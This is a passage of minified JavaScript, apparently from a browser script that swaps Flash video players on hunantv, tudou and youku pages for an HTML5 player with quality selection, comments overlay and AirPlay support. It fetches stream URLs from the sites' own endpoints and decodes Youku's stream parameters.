                                this.enableComment = !this.DOMs["comments-btn"].classList.contains("enable"),
                                    this.enableComment ? (setTimeout(function () {
                                        this.DOMs.comments.style.display = "block"
                                    }.bind(this), 80), this.DOMs["comments-btn"].classList.add("enable")) : (this.DOMs.comments.style.display = "none", this.DOMs["comments-btn"].classList.remove("enable"))
                            },
                            onAirplayBtnClick: function () {
                                this.video.webkitShowPlaybackTargetPicker()
                            }
                        }
                    },
                        {
                            "./createElement": 7,
                            "./delegateClickByClassName": 8,
                            "./timeFormat": 14
                        }],
                    5: [function (e, t) {
                        var n = (e("./extend"), e("./createElement"));
                        e("./parseDOMByClassNames"),
                            t.exports = {
                                init: function () {
                                    var e = 0;
                                    this.sourceList.forEach(function (t, i) {
                                        n("li", {
                                            appendTo: this.DOMs.hd,
                                            sourceIndex: i,
                                            className: "source " + (i === e ? "curr" : ""),
                                            innerHTML: t[0]
                                        })
                                    }.bind(this)),
                                        this.DOMs.video.src = this.sourceList[e][1]
                                }
                            }
                    },
                        {
                            "./createElement": 7,
                            "./extend": 9,
                            "./parseDOMByClassNames": 11
                        }],
                    6: [function (e, t) {
                        var n = e("./timeFormat");
                        t.exports = {
                            init: function () {
                                this.video.addEventListener("timeupdate", this.onVideoTimeUpdate.bind(this)),
                                    this.video.addEventListener("play", this.onVideoPlay.bind(this)),
                                    this.video.addEventListener("pause", this.onVideoTimePause.bind(this)),
                                    this.video.addEventListener("loadedmetadata", this.onVideoLoadedMetaData.bind(this)),
                                    this.video.addEventListener("webkitplaybacktargetavailabilitychanged", this.onPlaybackTargetAvailabilityChanged.bind(this)),
                                    setInterval(this.videoBuffered.bind(this), 1e3),
                                    this.DOMs.volume_anchor.style.width = 100 * this.video.volume + "%"
                            },
                            onVideoTimeUpdate: function () {
                                var e = this.video.currentTime,
                                    t = this.video.duration;
                                this.DOMs.current.innerHTML = n(e),
                                    this.DOMs.duration.innerHTML = n(t),
                                this.DOMs.progress_anchor.draging || (this.DOMs.progress_anchor.style.width = 100 * Math.min(Math.max(e / t, 0), 1) + "%")
                            },
                            videoBuffered: function () {
                                var e = this.video.buffered,
                                    t = this.video.currentTime,
                                    n = 0 == e.length ? 0 : e.end(e.length - 1);
                                this.DOMs.buffered_anchor.style.width = 100 * Math.min(Math.max(n / this.video.duration, 0), 1) + "%",
                                    0 == n || t >= n ? this.DOMs.player.classList.add("loading") : this.DOMs.player.classList.remove("loading")
                            },
                            onVideoPlay: function () {
                                this.DOMs.play.classList.remove("paused")
                            },
                            onVideoTimePause: function () {
                                this.DOMs.play.classList.add("paused")
                            },
                            onVideoLoadedMetaData: function () {
                                this.video.preloadStartTime && (this.video.currentTime = this.video.preloadStartTime, delete this.video.preloadStartTime)
                            },
                            onPlaybackTargetAvailabilityChanged: function (e) {
                                var t = "support-airplay";
                                "available" === e.availability ? this.DOMs.player.classList.add(t) : this.DOMs.player.classList.remove(t)
                            }
                        }
                    },
                        {
                            "./timeFormat": 14
                        }],
                    7: [function (e, t) {
                        function n(e, t) {
                            var n = document.createElement(e);
                            if ("function" == typeof t) t.call(n);
                            else for (var i in t) if (t.hasOwnProperty(i)) switch (i) {
                                case "appendTo":
                                    t[i].appendChild(n);
                                    break;
                                case "text":
                                    var o = document.createTextNode(t[i]);
                                    n.innerHTML = "",
                                        n.appendChild(o);
                                    break;
                                case "innerHTML":
                                case "className":
                                case "id":
                                    n[i] = t[i];
                                    break;
                                case "style":
                                    var r = t[i];
                                    for (var a in r) r.hasOwnProperty(a) && (n.style[a] = r[a]);
                                    break;
                                default:
                                    n.setAttribute(i, t[i] + "")
                            }
                            return n
                        }
                        t.exports = n
                    },
                        {}],
                    8: [function (e, t) {
                        function n(e) {
                            return Array.prototype.slice.call(e)
                        }
                        function i(e) {
                            this._eventMap = {},
                                this._rootElement = e,
                                this._isRootElementBindedClick = !1,
                                this._bindClickFunction = function (e) {
                                    !
                                        function t(e, i) {
                                            i && i.nodeName && (i.classList && n(i.classList).forEach(function (t) {
                                                e.trigger(t, i)
                                            }), t(e, i.parentNode))
                                        }(this, e.target)
                                }.bind(this)
                        }
                        var o = e("./extend");
                        o(i.prototype, {
                            on: function (e, t, n) {
                                void 0 === this._eventMap[e] && (this._eventMap[e] = []),
                                    this._eventMap[e].push([t, n]),
                                this._isRootElementBindedClick || (_isRootElementBindedClick = !0, this._rootElement.addEventListener("click", this._bindClickFunction, !1))
                            },
                            off: function (e, t) {
                                if (void 0 != this._eventMap[e]) for (var n = this._eventMap[e].length; n--;) if (this._eventMap[e][n][0] === t) {
                                    this._eventMap[e].splice(n, 1);
                                    break
                                }
                                for (var i in this._eventMap) break;
                                void 0 === i && this._isRootElementBindedClick && (_isRootElementBindedClick = !1, this._rootElement.removeEventListener("click", this._bindClickFunction, !1))
                            },
                            trigger: function (e, t) {
                                t = void 0 === t ? this._rootElement.getElementsByTagNames(e) : [t],
                                    t.forEach(function (t) {
                                        (this._eventMap[e] || []).forEach(function (e) {
                                            e[0].call(e[1], t)
                                        })
                                    }.bind(this))
                            }
                        }),
                            t.exports = function (e) {
                                return new i(e)
                            }
                    },
                        {
                            "./extend": 9
                        }],
                    9: [function (e, t) {
                        function n(e) {
                            for (var t, n = arguments.length, i = 1; n > i;) {
                                t = arguments[i++];
                                for (var o in t) t.hasOwnProperty(o) && (e[o] = t[o])
                            }
                            return e
                        }
                        t.exports = n
                    },
                        {}],
                    10: [function (e) {
                        function t(e, t, n, i) {
                            this.id = e,
                                this.size = t.split("x"),
                                this.sourceList = n || [],
                                this.comments = i,
                                this.init()
                        }
                        e("./component")(t, e("./component_build"), e("./component_event"), e("./component_video"), e("./component_source"), e("./component_comments")),
                            n = t
                    },
                        {
                            "./component": 1,
                            "./component_build": 2,
                            "./component_comments": 3,
                            "./component_event": 4,
                            "./component_source": 5,
                            "./component_video": 6
                        }],
                    11: [function (e, t) {
                        function n(e, t) {
                            var n = {};
                            return t.forEach(function (t) {
                                n[t] = e.getElementsByClassName(t)[0]
                            }),
                                n
                        }
                        t.exports = n
                    },
                        {}],
                    12: [function (e, t) {
                        t.exports = '* { margin:0; padding:0; }body { font-family: "PingHei","Lucida Grande", "Lucida Sans Unicode", "STHeiti", "Helvetica","Arial","Verdana","sans-serif"; font-size:16px;}html, body, .player { height: 100%; }.player:-webkit-full-screen { width: 100%; cursor:url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==); }.player:-moz-full-screen { width: 100%; cursor:url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==); }.player:full-screen { width: 100%; cursor:url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==); }.player { border-radius: 3px; overflow: hidden; position: relative; cursor: default;  -webkit-user-select: none;  -moz-user-select: none; user-select: none;}.video-frame { box-sizing: border-box; padding-bottom: 50px; height: 100%; overflow: hidden; position: relative;}.video-frame .comments{ position: absolute; top:0;left:0; width:100%; height:100%;  -webkit-transform:translateZ(0);  -moz-transform:translateZ(0); transform:translateZ(0);  pointer-events: none;}.player:-webkit-full-screen .video-frame { padding-bottom: 0px; }.player:-moz-full-screen .video-frame { padding-bottom: 0px; }.player:full-screen .video-frame{ padding-bottom: 0px; }.video { width: 100%;  height: 100%; background: #000000;}.controller {  position: absolute; bottom: 0px;  left:0; right:0;  background: #24272A;  height: 50px;}.controller .loading-icon { display: none;  position: absolute; width: 20px;  height: 20px; line-height: 20px;  text-align: center; font-size: 20px;  color: #ffffff; top: -30px; right: 10px;}.player.loading .controller .loading-icon {  display: block;}.player:-webkit-full-screen .controller { -webkit-transform:translateY(50px); -webkit-transition: -webkit-transform 0.3s ease;}.player:-moz-full-screen .controller { -moz-transform:translateY(50px);  -moz-transition: -moz-transform 0.3s ease;}.player:full-screen .controller {  transform:translateY(50px); transition: transform 0.3s ease;}.player.active:-webkit-full-screen { cursor: default;}.player.active:-moz-full-screen {  cursor: default;}.player.active:full-screen { cursor: default;}.player.active:-webkit-full-screen .controller,.player:-webkit-full-screen .controller:hover { -webkit-transform:translateY(0);  cursor: default;}.player.active:-moz-full-screen .controller,.player:-moz-full-screen .controller:hover { -moz-transform:translateY(0); cursor: default;}.player.active:full-screen .controller.player:full-screen .controller:hover {  transform:translateY(0);  cursor: default;}.player.active:-webkit-full-screen .controller .progress .progress_anchor:after,.player:-webkit-full-screen .controller:hover .progress .progress_anchor:after { height:12px;}.player.active:-moz-full-screen .controller .progress .progress_anchor:after,.player:-moz-full-screen .controller:hover .progress .progress_anchor:after { height:12px;}.player.active:full-screen .controller .progress .progress_anchor:after,.player:full-screen .controller:hover .progress .progress_anchor:after { height:12px;}.player:-webkit-full-screen .controller .progress .progress_anchor:after { height:4px;}.player:-moz-full-screen .controller .progress .progress_anchor:after { height:4px;}.player:full-screen .controller .progress .progress_anchor:after {  height:4px;}.controller .progress { position: absolute; top:0px;  left:0; right:0;  border-right: 4px solid #181A1D;  border-left: 8px solid #B3ABAB; height: 4px;  background: #181A1D;  z-index:1;  -webkit-transform: translateZ(0); -moz-transform: translateZ(0);  transform: translateZ(0);}.controller .progress:after { content:""; display: block; position: absolute; top:0px;  left:0; right:0;  bottom:-10px; height: 10px;}.controller .progress .anchor { height: 4px;  background: #B3ABAB;  position: absolute; top:0;left:0;}.controller .progress .anchor:after { content:""; display: block; width: 12px;  background: #f5f5f5;  position: absolute; right:-4px; top: 50%; height: 12px; box-shadow: 0 0 2px rgba(0,0,0, 0.4); border-radius: 12px;  -webkit-transform: translateY(-50%);  -moz-transform: translateY(-50%); transform: translateY(-50%);}.controller .progress .anchor.buffered_anchor {  position: relative; background: rgba(255,255,255,0.1);}.controller .progress .anchor.buffered_anchor:after {  box-shadow: none; height: 4px;  width: 4px; border-radius: 0; background: rgba(255,255,255,0.1);}.controller .right { height: 50px; position: absolute; top:0;  left:10px;  right:10px; pointer-events: none;}.controller .play,.controller .volume,.controller .time,.controller .hd,.controller .airplay,.controller .allscreen,.controller .normalscreen,.controller .comments-btn,.controller .fullscreen { padding-top:4px;  height: 46px; line-height: 50px;  text-align: center; color: #eeeeee; float:left; text-shadow:0 0 2px rgba(0,0,0,0.5);  pointer-events: auto;}.controller .hd,.controller .airplay,.controller .allscreen,.controller .normalscreen,.controller .comments-btn,.controller .fullscreen { float:right;}.controller .play {  width: 36px;  padding-left: 10px; cursor: pointer;}.controller .play:after {  font-family: "FontAwesome"; content: "\\f04c";}.controller .play.paused:after { content: "\\f04b";}.controller .volume {  min-width: 30px;  position: relative; overflow: hidden; -webkit-transition: min-width 0.3s ease 0.5s; -moz-transition: min-width 0.3s ease 0.5s;  transition: min-width 0.3s ease 0.5s;}.controller .volume:hover { min-width: 128px;}.controller .volume:before {  font-family: "FontAwesome"; content: "\\f028";  width: 36px;  display: block;}.controller .volume .progress { width: 70px;  top: 27px;  left: 40px;}.controller .time { font-size: 12px;  font-weight: bold;  padding-left: 10px;}.controller .time .current {  color: #EEEEEE;}.controller .fullscreen,.controller .airplay,.controller .allscreen,.controller .comments-btn,.controller .normalscreen { width: 36px;  cursor: pointer;}.controller .comments-btn {  margin-right: -15px;  display: none;}.player.has-comments .controller .comments-btn { display: block;}.controller .comments-btn:before {  font-family: "FontAwesome"; content: "\\f075";}.controller .comments-btn.enable:before {  color: #DF6558;}.controller .airplay,.controller .normalscreen {  display: none;}.player:-webkit-full-screen .controller .fullscreen,.player:-webkit-full-screen .controller .allscreen { display: none;}.player:-webkit-full-screen .controller .normalscreen,.player.allscreen .controller .normalscreen,.player.support-airplay .controller .airplay { display: block;}.player.allscreen .controller .allscreen {  display: none;}.controller .fullscreen:before { font-family: "FontAwesome"; content: "\\f0b2";}.controller .allscreen:before {  font-family: "FontAwesome"; content: "\\f065";}.controller .normalscreen:before { font-family: "FontAwesome"; content: "\\f066";}.controller .airplay { background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0ibWFtYS1haXJwbGF5LWljb24iIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIxNnB4IiB2aWV3Qm94PSIwIDAgMjIgMTYiIHhtbDpzcGFjZT0icHJlc2VydmUiPjxwb2x5bGluZSBwb2ludHM9IjUsMTIgMSwxMiAxLDEgMjEsMSAyMSwxMiAxNywxMiIgc3R5bGU9ImZpbGw6dHJhbnNwYXJlbnQ7c3Ryb2tlOndoaXRlO3N0cm9rZS13aWR0aDoxIi8+PHBvbHlsaW5lIHBvaW50cz0iNCwxNiAxMSwxMCAxOCwxNiIgc3R5bGU9ImZpbGw6d2hpdGU7c3Ryb2tlOnRyYW5zcGFyZW50O3N0cm9rZS13aWR0aDowIi8+PC9zdmc+DQo=) no-repeat center 20px;  background-size: 22px auto;}.controller .hd { white-space:nowrap; overflow: hidden; margin-right: 10px; text-align: right;}.controller .hd:hover li { max-width: 300px;}.controller .hd li {  display: inline-block;  max-width: 0px; -webkit-transition: max-width 0.8s ease 0.3s; -moz-transition: max-width 0.8s ease 0.3s;  transition: max-width 0.8s ease 0.3s; overflow: hidden; font-size: 14px;  font-weight: bold;  position: relative; cursor: pointer;}.controller .hd li:before {  content: "";  display: inline-block;  width:20px;}.controller .hd li:before { content: "";  display: inline-block;  width:20px;}.controller .hd li.curr { max-width: 300px; cursor: default;  color: #EEEEEE;}.controller .hd li.curr:after { content: "";  display: block; position: absolute; width:4px;  height:4px; border-radius: 50%; background: #ffffff;  left: 12px; top: 23px;  opacity: 0; -webkit-transition: opacity 0.5s ease 0.3s; -moz-transition: opacity 0.5s ease 0.3s;  transition: opacity 0.5s ease 0.3s;}'
                    },
                        {}],
                    13: [function (e, t) {
                        t.exports = '<div class="player">  <div class="video-frame"><video class="video" autoplay="autoplay"></video><canvas class="comments"></canvas></div>  <div class="controller">    <div class="loading-icon fa fa-spin fa-circle-o-notch"></div>   <div class="progress">      <div class="anchor buffered_anchor" style="width:0%"></div>     <div class="anchor progress_anchor" style="width:0%"></div>   </div>    <div class="right">     <div class="fullscreen"></div>      <div class="allscreen"></div>     <div class="normalscreen"></div>      <div class="airplay"></div>     <ul class="hd"></ul>      <div class="comments-btn"></div>     </div>    <div class="left">     <div class="play paused"></div>     <div class="volume">        <div class="progress">          <div class="anchor volume_anchor" style="width:0%"></div>       </div>      </div>      <div class="time">        <span class="current">00:00:00</span> / <span class="duration">00:00:00</span>      </div>     </div> </div></div>'
                    },
                        {}],
                    14: [function (e, t) {
                        function n(e, t) {
                            return (Array(t).join(0) + e).slice(-t)
                        }
                        function i(e) {
                            var t, i = [];
                            return [3600, 60, 1].forEach(function (o) {
                                i.push(n(t = e / o | 0, 2)),
                                    e -= t * o
                            }),
                                i.join(":")
                        }
                        t.exports = i
                    },
                        {}]
                }, {}, [10]),
                t.exports = n
        },
            {}],
        10: [function (e, t) {
            function n(e, t) {
                for (var n = decodeURI(e), i = f[t ? "strict" : "loose"].exec(n), o = {
                    attr: {},
                    param: {},
                    seg: {}
                }, r = 14; r--;) o.attr[p[r]] = i[r] || "";
                return o.param.query = a(o.attr.query),
                    o.param.fragment = a(o.attr.fragment),
                    o.seg.path = o.attr.path.replace(/^\/+|\/+$/g, "").split("/"),
                    o.seg.fragment = o.attr.fragment.replace(/^\/+|\/+$/g, "").split("/"),
                    o.attr.base = o.attr.host ? (o.attr.protocol ? o.attr.protocol + "://" + o.attr.host : o.attr.host) + (o.attr.port ? ":" + o.attr.port : "") : "",
                    o
            }
            function i(e, t) {
                if (0 === e[t].length) return e[t] = {};
                var n = {};
                for (var i in e[t]) n[i] = e[t][i];
                return e[t] = n,
                    n
            }
            function o(e, t, n, r) {
                var a = e.shift();
                if (a) {
                    var s = t[n] = t[n] || [];
                    "]" == a ? d(s) ? "" !== r && s.push(r) : "object" == typeof s ? s[u(s).length] = r : s = t[n] = [t[n], r] : ~a.indexOf("]") ? (a = a.substr(0, a.length - 1), !v.test(a) && d(s) && (s = i(t, n)), o(e, s, a, r)) : (!v.test(a) && d(s) && (s = i(t, n)), o(e, s, a, r))
                } else d(t[n]) ? t[n].push(r) : t[n] = "object" == typeof t[n] ? r : "undefined" == typeof t[n] ? r : [t[n], r]
            }
            function r(e, t, n) {
                if (~t.indexOf("]")) {
                    var i = t.split("[");
                    o(i, e, "base", n)
                } else {
                    if (!v.test(t) && d(e.base)) {
                        var r = {};
                        for (var a in e.base) r[a] = e.base[a];
                        e.base = r
                    }
                    "" !== t && s(e.base, t, n)
                }
                return e
            }
            function a(e) {
                return c(String(e).split(/&|;/), function (e, t) {
                    try {
                        t = decodeURIComponent(t.replace(/\+/g, " "))
                    } catch (n) {}
                    var i = t.indexOf("="),
                        o = l(t),
                        a = t.substr(0, o || i),
                        s = t.substr(o || i, t.length);
                    return s = s.substr(s.indexOf("=") + 1, s.length),
                    "" === a && (a = t, s = ""),
                        r(e, a, s)
                }, {
                    base: {}
                }).base
            }
            function s(e, t, n) {
                var i = e[t];
                "undefined" == typeof i ? e[t] = n : d(i) ? i.push(n) : e[t] = [i, n]
            }
            function l(e) {
                for (var t, n, i = e.length, o = 0; i > o; ++o) if (n = e[o], "]" == n && (t = !1), "[" == n && (t = !0), "=" == n && !t) return o
            }
            function c(e, t) {
                for (var n = 0, i = e.length >> 0, o = arguments[2]; i > n;) n in e && (o = t.call(void 0, o, e[n], n, e)),
                    ++n;
                return o
            }
            function d(e) {
                return "[object Array]" === Object.prototype.toString.call(e)
            }
            function u(e) {
                var t = [];
                for (var n in e) e.hasOwnProperty(n) && t.push(n);
                return t
            }
            function h(e, t) {
                return 1 === arguments.length && e === !0 && (t = !0, e = void 0),
                    t = t || !1,
                    e = e || window.location.toString(),
                {
                    data: n(e, t),
                    attr: function (e) {
                        return e = m[e] || e,
                            "undefined" != typeof e ? this.data.attr[e] : this.data.attr
                    },
                    param: function (e) {
                        return "undefined" != typeof e ? this.data.param.query[e] : this.data.param.query
                    },
                    fparam: function (e) {
                        return "undefined" != typeof e ? this.data.param.fragment[e] : this.data.param.fragment
                    },
                    segment: function (e) {
                        return "undefined" == typeof e ? this.data.seg.path : (e = 0 > e ? this.data.seg.path.length + e : e - 1, this.data.seg.path[e])
                    },
                    fsegment: function (e) {
                        return "undefined" == typeof e ? this.data.seg.fragment : (e = 0 > e ? this.data.seg.fragment.length + e : e - 1, this.data.seg.fragment[e])
                    }
                }
            }
            var p = ["source", "protocol", "authority", "userInfo", "user", "password", "host", "port", "relative", "path", "directory", "file", "query", "fragment"],
                m = {
                    anchor: "fragment"
                },
                f = {
                    strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
                    loose: /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
                },
                v = /^[0-9]+$/;
            t.exports = h
        },
            {}],
        11: [function (e, t) {
            function n(e) {
                var t = [];
                for (var n in e) e.hasOwnProperty(n) && t.push([n, e[n]].join("="));
                return t.join("&")
            }
            t.exports = n
        },
            {}],
        12: [function (e, t, n) {
            var i = e("./canPlayM3U8"),
                o = e("./ajax");
            n.match = function (e) {
                return /www\.hunantv\.com/.test(e.attr("host"))
            },
                n.getVideos = function (e, t) {
                    if (i) {
                        var n = function (e) {
                                var t = e.split("?")[1],
                                    n = new Array;
                                n = t.split("&");
                                var i = {};
                                for (key in n) param = n[key],
                                    item = new Array,
                                    item = n[key].split("="),
                                "" != item[0] && (i[item[0]] = item[1]);
                                return i
                            },
                            r = "&fmt=6&pno=7&m3u8=1",
                            a = document.getElementsByName("FlashVars")[0].getAttribute("value"),
                            s = a.split("&file=")[1],
                            l = s.split("%26fmt")[0];
                        l += r,
                            l = decodeURIComponent(l),
                            params = n(l);
                        var c = new Array;
                        c = ["570", "1056", "1615"],
                            urls = new Array,
                            params.limitrate = c[0],
                            text = "\u6807\u6e05",
                            o({
                                url: "http://pcvcr.cdn.imgo.tv/ncrs/vod.do",
                                jsonp: !0,
                                param: params,
                                callback: function (e) {
                                    "ok" == e.status && urls.push([text, e.info]),
                                        params.limitrate = c[1],
                                        text = "\u9ad8\u6e05",
                                        o({
                                            url: "http://pcvcr.cdn.imgo.tv/ncrs/vod.do",
                                            jsonp: !0,
                                            param: params,
                                            callback: function (e) {
                                                "ok" == e.status && urls.push([text, e.info]),
                                                    params.limitrate = c[2],
                                                    text = "\u8d85\u6e05",
                                                    o({
                                                        url: "http://pcvcr.cdn.imgo.tv/ncrs/vod.do",
                                                        jsonp: !0,
                                                        param: params,
                                                        callback: function (e) {
                                                            return "ok" == e.status && urls.push([text, e.info]),
                                                                t(urls)
                                                        }
                                                    })
                                            }
                                        })
                                }
                            })
                    } else console.log("\u8bf7\u4f7f\u7528Safari\u89c2\u770b\u672c\u89c6\u9891"),
                        setTimeout(function () {
                            return t()
                        }, 2e3)
                }
        },
            {
                "./ajax": 2,
                "./canPlayM3U8": 3
            }],
        13: [function (e, t, n) {
            var i = e("./canPlayM3U8"),
                o = e("./ajax"),
                r = e("./seeker_youku");
            n.match = function (e) {
                var t = window.iid || window.pageConfig && window.pageConfig.iid || window.itemData && window.itemData.iid,
                    n = window.itemData && window.itemData.vcode;
                return /tudou\.com/.test(e.attr("host")) && (n || t)
            },
                n.getVideos = function (e, t) {
                    var n = window.itemData && window.itemData.vcode;
                    if (n) return r.parseYoukuCode(n, t);
                    var a = window.iid || window.pageConfig && window.pageConfig.iid || window.itemData && window.itemData.iid,
                        s = function (e) {
                            var t, n = [
                                ["\u539f\u753b", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=5"],
                                ["\u8d85\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=4"],
                                ["\u9ad8\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=3"],
                                ["\u6807\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=2"]
                            ];
                            window.itemData && window.itemData.segs && (n = [], t = JSON.parse(window.itemData.segs), t[5] && n.push(["\u539f\u753b", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=5"]), t[4] && n.push(["\u8d85\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=4"]), t[3] && n.push(["\u9ad8\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=3"]), t[2] && n.push(["\u6807\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=2"])),
                                console.log("\u89e3\u6790tudou\u89c6\u9891\u5730\u5740\u6210\u529f " + n.map(function (e) {
                                        return "<a href=" + e[1] + ">" + e[0] + "</a>"
                                    }).join(" ")),
                                e(n)
                        },
                        l = function (e) {
                            o({
                                url: "http://vr.tudou.com/v2proxy/v2.js",
                                param: {
                                    it: a,
                                    st: "52%2C53%2C54"
                                },
                                jsonp: "jsonp",
                                callback: function (t) {
                                    if (-1 === t || -1 == t.code) return console.log("\u89e3\u6790tudou\u89c6\u9891\u5730\u5740\u5931\u8d25");
                                    for (var n = [], i = 0, o = t.urls.length; o > i; i++) n.push([i, t.urls[i]]);
                                    return console.log("\u89e3\u6790tudou\u89c6\u9891\u5730\u5740\u6210\u529f " + n.map(function (e) {
                                            return "<a href=" + e[1] + ">" + e[0] + "</a>"
                                        }).join(" ")),
                                        e(n)
                                }
                            })
                        };
                    i ? s(t) : l(t)
                }
        },
            {
                "./ajax": 2,
                "./canPlayM3U8": 3,
                "./seeker_youku": 14
            }],
        14: [function (e, t, n) {
            function i(e) {
                var t = [];
                for (var n in e) t.push(n + "=" + e[n]);
                return t.join("&")
            }
            function o(e) {
                if (!e) return "";
                e = e.toString();
                var t, n, i, o, r, a, s, l = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);
                for (a = e.length, r = 0, s = ""; a > r;) {
                    do t = l[255 & e.charCodeAt(r++)];
                    while (a > r && -1 == t);
                    if (-1 == t) break;
                    do n = l[255 & e.charCodeAt(r++)];
                    while (a > r && -1 == n);
                    if (-1 == n) break;
                    s += String.fromCharCode(t << 2 | (48 & n) >> 4);
                    do {
                        if (i = 255 & e.charCodeAt(r++), 61 == i) return s;
                        i = l[i]
                    } while (a > r && -1 == i);
                    if (-1 == i) break;
                    s += String.fromCharCode((15 & n) << 4 | (60 & i) >> 2);
                    do {
                        if (o = 255 & e.charCodeAt(r++), 61 == o) return s;
                        o = l[o]
                    } while (a > r && -1 == o);
                    if (-1 == o) break;
                    s += String.fromCharCode((3 & i) << 6 | o)
                }
                return s
            }
            function r(e) {
                if (!e) return "";
                e = e.toString();
                var t, n, i, o, r, a, s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                for (i = e.length, n = 0, t = ""; i > n;) {
                    if (o = 255 & e.charCodeAt(n++), n == i) {
                        t += s.charAt(o >> 2),
                            t += s.charAt((3 & o) << 4),
                            t += "==";
                        break
                    }
                    if (r = e.charCodeAt(n++), n == i) {
                        t += s.charAt(o >> 2),
                            t += s.charAt((3 & o) << 4 | (240 & r) >> 4),
                            t += s.charAt((15 & r) << 2),
                            t += "=";
                        break
                    }
                    a = e.charCodeAt(n++),
                        t += s.charAt(o >> 2),
                        t += s.charAt((3 & o) << 4 | (240 & r) >> 4),
                        t += s.charAt((15 & r) << 2 | (192 & a) >> 6),
                        t += s.charAt(63 & a)
                }
                return t
            }
            function a(e, t) {
                for (var n, i = [], o = 0, r = "", a = 0; 256 > a; a++) i[a] = a;
                for (a = 0; 256 > a; a++) o = (o + i[a] + e.charCodeAt(a % e.length)) % 256,
                    n = i[a],
                    i[a] = i[o],
                    i[o] = n;
                a = 0,
                    o = 0;
                for (var s = 0; s < t.length; s++) a = (a + 1) % 256,
                    o = (o + i[a]) % 256,
                    n = i[a],
                    i[a] = i[o],
                    i[o] = n,
                    r += String.fromCharCode(t.charCodeAt(s) ^ i[(i[a] + i[o]) % 256]);
                return r
            }
            function s(e, t) {
                for (var n = [], i = 0; i < e.length; i++) {
                    var o = 0;
                    o = e[i] >= "a" && e[i] <= "z" ? e[i].charCodeAt(0) - "a".charCodeAt(0) : e[i] - "0" + 26;
                    for (var r = 0; 36 > r; r++) if (t[r] == o) {
                        o = r;
                        break
                    }
                    n[i] = o > 25 ? o - 26 : String.fromCharCode(o + 97)
                }
                return n.join("")
            }
            function l(e, t, n) {
                var i = this;
                new Date,
                    this._sid = m.sid,
                    this._fileType = n,
                    this._videoSegsDic = {},
                    this._ip = e.security.ip;
                var o = (new c, []),
                    r = [];
                r.streams = {},
                    r.logos = {},
                    r.typeArr = {},
                    r.totalTime = {};
                for (var a = 0; a < t.length; a++) {
                    for (var s = t[a].audio_lang, l = !1, d = 0; d < o.length; d++) if (o[d] == s) {
                        l = !0;
                        break
                    }
                    l || o.push(s)
                }
                for (var a = 0; a < o.length; a++) {
                    for (var u = o[a], h = {}, p = {}, f = [], d = 0; d < t.length; d++) {
                        var v = t[d];
                        if (u == v.audio_lang) {
                            if (!i.isValidType(v.stream_type)) continue;
                            var g = i.convertType(v.stream_type),
                                y = 0;
                            "none" != v.logo && (y = 1),
                                p[g] = y;
                            var b = !1;
                            for (var w in f) g == f[w] && (b = !0);
                            b || f.push(g);
                            var x = v.segs;
                            if (null == x) continue;
                            var k = [];
                            b && (k = h[g]);
                            for (var A = 0; A < x.length; A++) {
                                var C = x[A];
                                if (null == C) break;
                                var T = {};
                                T.no = A,
                                    T.size = C.size,
                                    T.seconds = Number(C.total_milliseconds_video) / 1e3,
                                    T.milliseconds_video = Number(v.milliseconds_video) / 1e3,
                                    T.key = C.key,
                                    T.fileId = this.getFileId(v.stream_fileid, A),
                                    T.src = this.getVideoSrc(d, A, e, v.stream_type, T.fileId),
                                    T.type = g,
                                    k.push(T)
                            }
                            h[g] = k
                        }
                    }
                    var M = this.langCodeToCN(u).key;
